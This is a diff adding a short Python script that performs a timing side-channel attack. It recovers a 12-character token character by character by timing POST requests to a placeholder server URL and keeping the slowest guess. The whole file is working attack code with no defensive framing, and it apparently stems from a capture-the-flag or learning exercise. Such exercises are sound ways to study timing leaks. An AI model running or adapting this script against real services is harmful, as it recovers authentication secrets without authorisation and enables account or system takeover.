@@ -1,0 +1,51 @@
+import requests
+import time
+import string
+import random
+import itertools
+
+
+def post(token):
+    before = time.time()
+
+    #send a POST request to server
+    resp = requests.post("Name of the website", json = {"token": token})
+
+    after = time.time()
+    time_diff = after-before
+
+    #useful for debugging
+    print("Token {}, request took {:.3f}".format(token, time_diff))
+
+    #often useless
+    #print("response is {}".format(resp.text))
+
+
+    return time_diff, resp.text
+
+if __name__ == "__main__":
+    #include all lower + upper letters + digits
+    possibleCharacters = string.ascii_letters + string.digits
+    length = 12
+    myToken = ""
+    differentPossibilities = []
+    for i in range (12):
+        testToken = "0"*length
+        dictTime = {}
+        maxTime = 0
+        maxTimeToken = ""
+        for letter in possibleCharacters:
+            tryToken = myToken + letter + testToken[i+1:]
+            timeDiff = post(token=tryToken)
+            dictTime[letter] = timeDiff
+
+        # Now we will compare timediff for one iteration
+        for key in dictTime:
+            currentTime = dictTime[key][0]
+            if currentTime > maxTime:
+                maxTime = currentTime
+                maxTimeToken = key
+        myToken = myToken + maxTimeToken
+        print("letter: ", maxTimeToken, "took: ", maxTime)
+        print ("current Token: ",myToken)
+    print (post(token=myToken))
